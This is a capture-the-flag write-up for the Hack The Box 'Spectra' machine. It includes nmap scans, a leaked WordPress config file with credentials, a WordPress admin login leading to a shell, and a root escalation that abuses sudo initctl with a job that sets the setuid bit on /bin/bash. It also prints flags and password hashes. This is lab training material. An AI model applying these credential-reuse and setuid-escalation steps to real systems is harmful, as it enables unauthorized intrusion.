# Spectra HTB Writeup

## All Ports Scan

```bash
# Nmap 7.91 scan initiated Fri Jun 11 20:41:16 2021 as: nmap -sT -vv -oA nmap/allports 10.10.10.229
Nmap scan report for 10.10.10.229
Host is up, received echo-reply ttl 63 (0.25s latency).
Scanned at 2021-06-11 20:41:16 EDT for 30s
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3306/tcp open  mysql   syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Jun 11 20:41:46 2021 -- 1 IP address (1 host up) scanned in 30.57 seconds
```
	
## Complete Scan

```bash
# Nmap 7.91 scan initiated Fri Jun 11 20:43:03 2021 as: nmap -sT -sV -sC -A -vv -p22,80,3306 -oA nmap/complete 10.10.10.229
Nmap scan report for 10.10.10.229
Host is up, received echo-reply ttl 63 (0.34s latency).
Scanned at 2021-06-11 20:43:04 EDT for 50s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|   4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDF1xom8Ljz30NltgYXTRoVI2ymBlBZn849bnFYNKwDgwvW9naxom8pe9mzV+I8pAb5AHeVdok7szaIke7nXINK5GdHw+P529fkRNfmq4V63RUmYNKeAZmfGubCQDwGHP0Gj8S/C1lCMp/9kdNPxDv8aamWTeVCTuqDOwMy0GmEGRyk9gaZjwA2T3kIVD/TjLVu5hkpwdoQHr0JYhJRqLKHqZqdcZY7vqUFuECqcgVZ0Sj52/VnT5lis+N3hZK1MqJW2vlPhdlXhESF2O2Z0gzVtnAMB8yT68pbcRUbl6OI0NC6ucKzSIb6g90vwF1kVlj22GXTcfu0r3tyCFlusJFnuhgAIrTax8eQu5W+vLAAM0pbMizVNOEzd4VtBpLBHunEkzDknUZn3k9X3XP9NsIReMW+T8XiLTSxZuve8EWdaIfXoAeUlj0Tsy2iwYfLk6XaO5xssZgHFvB4QnUvpdt2ybsfTEd1aySikuetak9pl7yECFD8jgqT6ybzG1qsTMsdsJz6o871al1r0Dyd76R0Dr3+dO7AhLJtPszZHJXK3YqCqF/qU6kNIPMTIXdiVEuYQ1JieYzyjN3CivzVUPFnvOu2+dD5kFQSQNqR8kHGRqZXW0oUQsDUh1GQsb+iO8sFMDIAqr1SfAKQEpCPpSFl6H1wtNHW8pJJNwj1FkKNXw==
80/tcp   open  http    syn-ack nginx 1.17.4
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   syn-ack MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=6/11%OT=22%CT=%CU=41167%PV=Y%DS=2%DC=T%G=N%TM=60C4034A%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)
SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 8.058 days (since Thu Jun  3 19:20:54 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   509.30 ms 10.10.14.1
2   509.42 ms 10.10.10.229

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 11 20:43:54 2021 -- 1 IP address (1 host up) scanned in 51.99 seconds
```


## Port 80 Enumeration
Static page is running with some embeded link, Let's look into it.

![](Image/Pasted%20image%2020210611204151.png)

After visiting the page two website is running in different directory

![](Image/Pasted%20image%2020210611204643.png)
![](Image/Pasted%20image%2020210611204659.png)

And in the testing Directory listing is enable. So let's search for some sauce.
And here we have wp-config.php.save file.

```bash
Resolve host using Curl : 
# curl http://spectra.htb/testing/wp-config.php.save
```

![](Image/Pasted%20image%2020210611204850.png)

And Here we got the credentials

```bash
DB Credentials
Username : devtest
Password : devteam01
```

While looking for wordpress website we got the username too for wordpress.

![](Image/Pasted%20image%2020210611205103.png)

```bash
Wordpress Credentials 
Username : administrator
Password : devteam01
```

Now logged in with this credentials

![](Image/Pasted%20image%2020210611205938.png)

Got a shell

![](Image/Pasted%20image%2020210611205957.png)

## Priv Esec

![](Image/Pasted%20image%2020210611210229.png)

```bash 
wp-config.php (Credentials)
Username : dev
Password : development01
```

While enumerating got autologin.conf.orig in /opt

![](Image/Pasted%20image%2020210611210852.png)

After reading file observed it is saving some data in /etc/autologin

![](Image/Pasted%20image%2020210611211006.png)

And here we got one password.

![](Image/Pasted%20image%2020210611211152.png)

```bash
Credentials 
Username : katie
Password : SummerHereWeCome!!
```

## Level 1

After taking a user let's move forward for root.

![](Image/Pasted%20image%2020210611211504.png)

We have a privilege to run initctl as a super user, so let's migrate the service

![](Image/Pasted%20image%2020210611214827.png)

We see that the test file is running it feel suspicious, So look into it.

I tried to change permission of /etc/passwd but we can't switch the user because of some misconfiguration.

```bash
Client PC :
# vim test.conf
	script
		chmod +s /bin/bash
	end script

katie@spectra /etc/init $ sudo /sbin/initctl start test

katie@spectra /etc/init $ find / -perm -u=s 2>/dev/null
	/usr/bin/sudo
	/usr/bin/powerd_setuid_helper
	/usr/libexec/dbus-daemon-launch-helper
	/bin/bash

```

And here we find the permission of /bin/bash is changed.

So root it.

![](Image/Pasted%20image%2020210611214731.png)

```bash
Flags :
User : e89d27fe195e9114ffa72ba8913a6130
Root : d44519713b889d5e1f9e536d0c6df2fc

Hash : 
root:$1$lchcuPsn$BgyskySIi0hFMF4/v7S53.:18661::::::
katie:$1$IL2kvPV1$mYHaoPio5/jIZ.JL/RLr2/:18662:0:99999:7:::
```
